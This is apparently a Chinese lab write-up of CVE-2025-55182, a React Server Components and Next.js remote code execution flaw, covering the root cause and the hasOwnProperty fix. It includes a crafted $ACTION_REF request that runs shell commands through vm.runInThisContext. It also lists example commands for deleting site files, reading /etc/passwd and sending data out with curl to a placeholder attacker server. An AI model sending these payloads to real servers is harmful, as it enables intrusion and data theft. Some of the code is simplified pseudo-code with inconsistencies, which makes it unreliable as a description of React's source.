---
title: React&RSC&Next.js 服务器组件漏洞
description: ""
date: 2026-08-19T15:13:53+08:00
lastmod: 2026-08-19T15:15:45+08:00
draft: false
slug: MuvosL-2026-006
categories:
  - 漏洞复现
tags:
---
这里因为是最近我了解到的一个漏洞，直接拿好靶场中的一个靶场来进行学习
![[Pasted image 20251205194554.png]]

# **这里是我把下面的全部写完之后对这个靶场中为什么这样构造请求的理解**

> [!NOTE] 
> 参考学习文章 **奇安信攻防社区**，以及ai辅助源代码理解
> [奇安信攻防社区-React 服务器组件原型链漏洞（CVE-2025-55182）](https://forum.butian.net/article/820)

在利用CVE-2025-55182漏洞时，攻击者通过构造特殊的`$ACTION_REF`系列键值对向服务器发送恶意请求。例如，`$ACTION_REF_0`作为一个动作引用的标识符，其对应的值（如`$ACTION_0:0`）指向了一段包含攻击载荷的JSON数据。

服务器在接收到请求后，会识别出`$ACTION_REF`前缀，并按照React Server Actions的协议处理流程，调用`decodeBoundActionMetaData`函数来解析关联的数据段（即`$ACTION_0:0`字段中的JSON字符串）。解析后会得到两个关键部分：`id`和`bound`。攻击者将`id`设置为`"vm#runInThisContext"`，意图调用Node.js的vm模块方法。

随后，系统会使用这个`id`去`serverManifest`（服务端函数注册表）中查找对应的函数。问题的关键在于，漏洞版本的加载机制（`loadServerReference`函数）过度信任客户端提供的`id`值，未对其合法性进行校验。这使得攻击者可以通过构造的`id`指向任何可访问的JavaScript函数，包括Node.js内置的危险模块。因此，攻击者可以在`bound`参数中传入任意的JavaScript代码字符串。

当恶意`id`指向`vm.runInThisContext`，并且`bound`参数中包含恶意代码时，这些代码将在服务器端的Node.js环境中被执行。尽管JavaScript通常作为前端语言，但React Server Components（RSC）的特性决定了这些组件逻辑是在服务器端渲染和执行的。因此，当攻击者在`bound`参数中写入通过`child_process`模块调用系统命令（如`ls`）的代码，并利用`execSync`执行后，命令的输出结果会通过`toString`方法被捕获，并最终返回给客户端浏览器，从而实现命令执行结果的回显。

Next.js框架构建于React之上，其RSC（React Server Components）机制在解析`$ACTION_REF`时，由于缺乏对客户端输入的有效过滤和校验，完全信任了请求内容，最终导致了远程任意代码执行漏洞。

针对该漏洞的防御手段，可以从多处入手。例如，在`decodeBoundActionMetaData()`或 `loadServerReference()`函数中增加白名单校验机制，只允许调用预先定义的、安全的服务端函数。更深层次的修复关键在于`requireModule()`函数。该函数负责根据`id`（如`"vm#runInThisContext"`）动态加载指定模块（`vm`）并获取其导出属性（`runInThisContext`）。漏洞版本的`requireModule`函数直接通过属性名访问（`moduleExports[metadata.exportName]`），这可能会因JavaScript的原型链查找机制而被污染（例如，如果`Object.prototype`被恶意添加了`runInThisContext`属性，即使模块本身没有该属性，也会从原型链上找到并执行）。

因此，根本的修复方案是在`requireModule`函数中，在访问导出属性前，使用`Object.prototype.hasOwnProperty`进行严格检查，确保只访问目标模块对象自身的属性，而不会沿原型链向上查找，从而切断了通过原型链污染注入恶意函数的攻击路径。官方修复代码正是通过引入这一检查来彻底解决此漏洞。

---

在 `requireModule`函数中，原来的漏洞代码是这样的：

```javascript
// 漏洞代码
function requireModule(metadata) {
  const moduleExports = require(metadata.moduleName);
  const func = moduleExports[metadata.exportName];  // 👈 问题在这里！
  return func;
}
```

攻击者传入：


```JavaScript
metadata = {
  moduleName: "vm",
  exportName: "runInThis"
}
```

 
 🤔 为什么 `moduleExports["runInThisContext"]`不安全？

 1. **JavaScript 原型链查找机制**

在 JavaScript 中，当访问对象的属性时，会沿着原型链向上查找：

```JavaScript
const obj = { a: 1 };
console.log(obj.a);  // 1 - 访问自身属性
console.log(obj.toString);  // [Function] - 从原型链上找到

// 原型链示例
const child = {};
console.log(child.someProperty);  // undefined
Object.prototype.someProperty = "危险！";  // 污染原型链
console.log(child.someProperty);  // "危险！" - 从原型链找到！
```

2. **漏洞场景**

```JavaScript
// 假设有人污染了 Object.prototype
Object.prototype.runInThisContext = function() {
  console.log("我是被恶意注入的函数！");
  return "恶意返回值";
};

// 攻击者传入：
metadata = {
  moduleName: "someModule",  // 不是 vm 模块
  exportName: "runInThisContext"  // 但 someModule 没有这个属性
}

// 在 requireModule 中：
const moduleExports = require("someModule");
// moduleExports 自身没有 runInThisContext 属性
console.log(moduleExports.hasOwnProperty("runInThisContext"));  // false

// 但通过原型链能找到！
const func = moduleExports["runInThisContext"];  // 找到 Object.prototype.runInThisContext();  // 执行恶意函数！
```


# 漏洞原理
- **漏洞根源**：React Server Components (RSC)，中使用冒号：分割对象属性的机制存在缺陷
- **漏洞利用条件**：Next.js默认配置即可利用，无需任何前置条件

# 知识点了解
### <1> recat 是什么
react是一个用户构建用户界面的JavaScript库，React 采用了**组件化**的开发模式，**将页面拆分为一个个独立的组件，每个组件只负责自身的状态和渲染**。通过这种方式，可以显著提高代码的可复用性和可维护性。
其实这儿可以和fastjson那个概念结合着理解，fastjson是阿里开发的一个java里的库。

### <2> Next.js是什么
它就是一个框架，提前弄好了一堆开发react应用所需的东西的这么一个东西。

### <3> 漏洞描述
CVE-2025-55182 是 React Server Components（版本 19.0.0 至 19.2.0）中的一个高危预认证远程代码执行漏洞，源于服务端在反序列化 Server Action 请求时未校验模块导出属性的合法性，攻击者可通过操控请求负载访问原型链上的危险方法（如 vm.runInThisContext），进而执行任意系统命令，只要应用依赖中包含 vm、child_process 或 fs 等常见 Node.js 模块即可被利用。

影响组件：`react-server-dom-webpack` < 19.2.0，`react-server-dom-turbopack` < 19.2.0，`react-server-dom-parcel`

影响版本：React 19.0.0、19.1.0、19.1.1、19.2.0


> [!知识获取] 知识get

>React Server Components（RSC）是React的一项革新性技术，它允许你在服务器上运行和渲染组件。你可以把它想象成在餐厅里，厨师（服务器）在厨房帮你把食材处理好、烹饪好，然后直接端上一盘成品菜，而不是把一堆生鲜食材和整个厨房（所有代码）都搬到你的餐桌（浏览器）上让你自己处理

这儿我就理解了为什么一个前端的东西会让服务器执行什么命令了

### <4> 漏洞成因

React Server Actions 通过 `$ACTION_REF_*` 和 `$ACTION_ID_*` 两类字段实现服务端函数调用，但在 19.2.0 及之前版本中，因缺少对模块导出属性的合法性校验，攻击者可借助 `$ACTION_REF_*` 机制注入任意 `id`（如 `"vm#runInThisContext"`），结合 Node.js 内置模块实现远程代码执行


# 代码分析
### $ACTION_ID_*：直接呼叫函数名

可以把 `$ACTION_ID_*`理解为**直接告诉服务器“请执行某个特定函数”**。就像你对着手机说“嘿 Siri，播放音乐”，手机听到“播放音乐”这个指令名，就会去执行对应的功能。

- **工作机制**：当你在客户端组件的表单中设置 `action={serverFunction}`并提交时，React 会自动在发送给服务器的请求数据中创建一个字段，例如 `$ACTION_ID_UserActions.updatePassword = ""`。服务器收到请求后，会解析这个字段的值（例如 `"UserActions.updatePassword"`），找到对应的服务端函数并执行


### $ACTION_REF_*：引用一个已配置好的操作包

`$ACTION_REF_*`则更像是一个**快捷方式或引用**。它不仅仅告诉服务器“要做什么”，还可能预先绑定好了一些参数。这类似于你手机上的快捷指令，点击一下就能执行一系列复杂操作（比如“下班模式”：关闭办公室灯光、打开空调、播放特定歌单）。

- **工作机制**：它允许客户端引用一个在服务器上已定义好的“动作引用”（包含函数标识和预先绑定的参数）。在漏洞版本中，攻击者正是通过恶意构造 `$ACTION_REF_*`和相关字段（如 `$ACTION_0:0`），将函数指向危险的 `vm#runInThisContext`并绑定恶意代码作为参数，从而触发远程代码执行（RCE）

### 代码分析
下面是相关代码
```javascript
exports.decodeAction = function (body, serverManifest) : null | any {
    var formData : FormData = new FormData(),
    action : null = null;
    body.forEach(function (value, key) : void {
        key.startsWith("$ACTION_")
        ? key.startsWith("$ACTION_REF_")
        ? ((value = "$ACTION_" + key.slice(12) + ":"),
            (value = decodeBoundActionMetaData(body, serverManifest, value)),
            (action = loadServerReference(
                serverManifest,
                value.id,
                value.bound
            )))
            : key.startsWith("$ACTION_ID_") &&
                ((value = key.slice(11)),
                (action = loadServerReference(serverManifest, value, bound: null)))
        : formData.append(key, value);
    });
    return null === action
        ? null
    : action.then(function (fn) {
        return fn.bind(null, formData);
    });
};
```
**第一步，分离数据与指令**
```javascript
var formData = new FormData(), action = null;
body.forEach(function (value, key) { ... })
```
- 代码遍历请求体（FormData）的所有键值对
    
- 创建新的 `formData`用于存放普通表单字段
    
- 识别并处理以 `"$ACTION_"`开头的特殊指令字段

**第二步，两种 Action 的差异化处理**

情况一：`$ACTION_ID_*`（直接调用）


```JavaScript
key.startsWith("$ACTION_ID_") && 
  ((value = key.slice(11)),
   (action = loadServerReference(serverManifest, value, bound: null)))
```

- **提取ID**：从 `$ACTION_ID_value`中提取 `"value"`
    
- **简单加载**：直接调用 `loadServerReference(serverManifest, "value", null)`
    
- **特点**：不携带额外参数，纯粹的函数引用
    

 情况二：`$ACTION_REF_*`（带参数的引用）


```JavaScript
key.startsWith("$ACTION_REF_") &&
  ((value = "$ACTION_" + key.slice(12) + ":"),
   (value = decodeBoundActionMetaData(body, serverManifest, value)),
   (action = loadServerReference(serverManifest, value.id, value.bound)))
```

- **构造查找键**：从 `$ACTION_REF_0`构造为 `"$ACTION_0:"`
    
- **解码元数据**：调用 `decodeBoundActionMetaData`解析出：
    
    - `id`：要调用的函数标识
        
    - `bound`：已绑定的参数数组
        
    
- **复杂加载**：加载带有预绑定参数的函数引用

 **第三步，普通表单字段处理**


```
formData.append(key, value);
```

- 非 `$ACTION_`开头的字段直接存入新的 FormData
    
- 这些是实际要传递给 Server Action 的数据

**第四步，返回结果处理**
有`Action`时,解析后
- 获取实际的服务器函数 `fn`
    
- 将 `formData`绑定为该函数的第一个参数
    
- 返回可执行的函数

`decoudeBoundActionMetaData`
在漏洞版本中，直接信任客户端提供的id，导致任意代码执行
漏洞原理：攻击者可设置 `id: "vm#runInThisContext"`, `bound: ["恶意代码"]`
**下面是漏洞版本的这个函数具体实现代码**
```javascript 
// 伪代码
function decodeBoundActionMetaData(body, manifest, key) {
  const rawData = body.get(key); // 从客户端获取完整元数据
  return JSON.parse(rawData);    // 反序列化并完全信任
  // 危险：客户端可控制 id 和 bound！
}
```




> [!NOTE] 
> **为什么要设置 `"vm#runInThisContext"`？**

### 1. **Node.js 的 vm 模块**

- `vm`是 Node.js 的内置模块，用于在 V8 虚拟机中执行 JavaScript 代码
    
- `runInThisContext()`是 `vm`模块的方法，它可以在**当前全局上下文**中编译并执行代码
    
- 这意味着它可以访问所有全局变量、require 模块、环境变量等
    

### 2. **攻击者的思路：控制代码执行**

攻击者想要在服务器上执行任意代码，需要：

- **找到可执行的函数**：`vm.runInThisContext`正好满足
    
- **传递代码作为参数**：通过 `bound`数组传递恶意代码字符串
    
- **触发执行**：让 React 的 Server Actions 调用这个函数
    

### 3. **为什么这个 id 格式有效？**

在 `loadServerReference`函数中（代码图中未显示，但在 React 源码中），有这样的逻辑：

```javascript
function loadServerReference(serverManifest, id, bound) {
  // 假设 id = "vm#runInThisContext"
  const [moduleName, functionName] = id.split('#');
  // moduleName = "vm", functionName = "runInThisContext"
  
  const module = require(moduleName);  // 动态加载 vm 模块
  const func = module[functionName];    // 获取 runInThisContext 方法
  
  // 将 bound 参数绑定到函数
  return func.bind(null, ...bound);
}
```



`serverManifest`的作用
这是服务端的函数注册表：
包含了所有允许客户端调用的 Server Actions
loadServerReference根据 id从此清单中查找函数

# 完整攻击流程演示
### 场景：攻击者想查看服务器上有哪些文件

**攻击者构造的 HTTP 请求**：

```bash
POST /api/actions HTTP/1.1
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="$ACTION_REF_0"

--boundary
Content-Disposition: form-data; name="$ACTION_0:0"

{"id":"vm#runInThisContext","bound":["const cp=require('child_process');return cp.execSync('ls -la /').toString();"]}
--boundary--
```

**服务器处理流程**：

```javascript
// 1. decodeAction 处理请求
exports.decodeAction = function (body, serverManifest) {
  var formData = new FormData(), action = null;
  
  body.forEach(function (value, key) {
    if (key.startsWith("$ACTION_REF")) {
      // 解析出攻击者提供的元数据
      value = "$ACTION_" + key.slice(12) + ":";
      value = decodeBoundActionMetaData(body, serverManifest, value);
      // value 现在是: {id: "vm#runInThisContext", bound: ["恶意代码"]}
      
      // 加载这个危险的"引用"
      action = loadServerReference(serverManifest, value.id, value.bound);
      // 返回: vm.runInThisContext.bind(null, "恶意代码")
    }
  });
  
  return action.then(function(fn) {
    // fn 是 vm.runInThisContext.bind(null, "恶意代码")
    return fn.bind(null, formData);
  });
};
```

**最终执行的服务器代码**：

```javascript
// 在服务器 Node.js 进程中执行
const vm = require('vm');

// 这是实际执行的代码
const result = vm.runInThisContext(`
  const cp = require('child_process');
  return cp.execSync('ls -la /').toString();
`);

// result 包含服务器根目录的文件列表
console.log(result);
// 输出类似:
// total 128
// drwxr-xr-x  24 root root  4096 Jan 1 00:00 .
// drwxr-xr-x  24 root root  4096 Jan 1 00:00 ..
// drwxr-xr-x   2 root root  4096 Jan 1 00:00 bin
// drwxr-xr-x   3 root root  4096 Jan 1 00:00 etc
// ...
```

## 🔄 为什么这能执行系统命令？

### 关键区别：前端 JS vs 后端 JS

|前端 JavaScript|后端 JavaScript (Node.js)|
|---|---|
|在浏览器中运行|在服务器上运行|
|只能操作 DOM、浏览器 API|可以访问服务器文件系统、数据库、进程等|
|不能执行系统命令|可以执行系统命令（如 `ls`、`rm`、`cat`等）|
|受浏览器沙箱限制|有服务器操作系统的完整权限|

### Node.js 的 `child_process`模块

```javascript
// 在 Node.js 中，可以执行系统命令
const { execSync } = require('child_process');

// 执行 ls 命令
const files = execSync('ls -la /');
console.log(files.toString());  // 看到服务器上的文件

// 执行任意命令
execSync('rm -rf /var/www/*');  // 删除网站文件
execSync('cat /etc/passwd');    // 查看用户信息
execSync('curl http://黑客服务器/窃取数据'); // 外传数据
```


## 💡 核心安全问题

1. **信任边界被打破**：服务器相信了客户端提供的函数名（`vm#runInThisContext`）
    
2. **动态加载危险模块**：通过字符串 `"vm"`动态加载 Node.js 模块
    
3. **参数作为代码执行**：`bound`参数的内容被当作 JavaScript 代码执行
    
4. **绕过所有安全检查**：攻击者可以执行任何 Node.js 能做的事情
    


|步骤|正常流程|攻击流程|
|---|---|---|
|1|客户端调用预定义的 Server Action|客户端构造恶意 `$ACTION_REF_*`请求|
|2|服务器验证 Action 是否允许|服务器漏洞：信任了客户端提供的函数名|
|3|执行预定义的安全函数|服务器加载了危险的 `vm.runInThisContext`|
|4|返回安全的结果|执行攻击者的恶意代码（如 `ls`命令）|
|5|客户端收到业务数据|攻击者收到服务器文件列表|

**所以，`id: "vm#runInThisContext"`是攻击者告诉服务器："不要执行我预定义的 Server Action，请执行 Node.js 的 `vm.runInThisContext`函数，并把我提供的字符串当作代码来执行"。**

## child_process
Node.js 的 `child_process`模块是一个核心模块，它允许你在 Node.js 应用程序中**创建并管理子进程**。这解决了 Node.js 自身单线程模型的局限性，让你能够执行系统命令、运行其他脚本或程序，从而大大扩展了应用的能力

| 方法名称            | 核心特点与适用场景                                                                                        |
| --------------- | ------------------------------------------------------------------------------------------------ |
| **`spawn`**​    | **最基础、灵活**的方法。适用于需要**流式处理**大量数据（如大文件操作）或长时间运行的进程<br><br>。                                        |
| **`exec`**​     | 会启动一个 **Shell**​ 来执行命令。适合执行简单的 **Shell 命令**，并一次性获取所有输出。**注意：如果命令字符串包含用户输入，有安全风险**<br><br>。       |
| **`execFile`**​ | 直接执行**可执行文件**，不启动 Shell。因此比 `exec`**更安全、效率更高**，适用于运行二进制文件或脚本<br><br>。                            |
| **`fork`**​     | `spawn`的特殊形式，专门用于**创建新的 Node.js 子进程**。父子进程间可通过 **IPC（进程间通信）通道**方便地传递消息，非常适合处理 CPU 密集型任务<br><br>。 |


